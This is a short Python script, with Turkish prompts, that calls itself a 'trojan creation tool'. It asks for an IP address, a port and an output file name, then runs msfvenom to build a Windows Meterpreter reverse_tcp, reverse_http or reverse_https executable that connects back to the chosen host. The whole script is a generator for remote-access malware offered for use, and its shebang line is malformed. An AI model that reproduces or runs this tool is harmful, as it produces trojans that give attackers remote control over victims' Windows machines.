#!/home/kali python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet trojan olusturma")
print("""

trojan olusturma aracina hos geldiniz 

""")

ip = raw_input("local veya dis ip girin: ")
port = raw_input("port: ")
print("""
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")
payload = raw_input("payload no: ")
kayityeri = raw_input("kayit yeri: ")

if(payload=="1"):
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
elif(payload=="2"):
        os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
elif(payload=="3"):
        os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)  
        
   
